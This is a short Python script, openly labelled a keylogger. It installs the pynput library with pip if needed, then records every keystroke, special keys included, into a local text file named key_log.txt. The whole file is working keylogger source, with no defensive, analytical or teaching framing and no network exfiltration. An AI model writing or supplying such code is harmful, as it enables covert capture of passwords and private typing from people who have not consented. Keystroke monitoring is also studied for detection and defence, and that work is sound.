import subprocess
import sys

# Step 1: Install dependencies (if not already installed)
def install_dependencies():
    try:
        # Try to import pynput to check if it's already installed
        import pynput
    except ImportError:
        # If not installed, install it via pip
        print("Installing required dependencies...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
        print("Dependencies installed successfully.")

# Step 2: Keylogger code
def start_keylogger():
    from pynput.keyboard import Listener

    log_file = "key_log.txt"

    def on_press(key):
        try:
            with open(log_file, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(log_file, "a") as f:
                if key == key.space:
                    f.write(" ")
                else:
                    f.write(f" [{key}] ")

    # Start the keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()

# Main function to install dependencies and run the keylogger
def main():
    install_dependencies()  # Install dependencies if needed
    print("Starting the keylogger...")
    start_keylogger()  # Start keylogger after dependencies are ensured

if __name__ == "__main__":
    main()
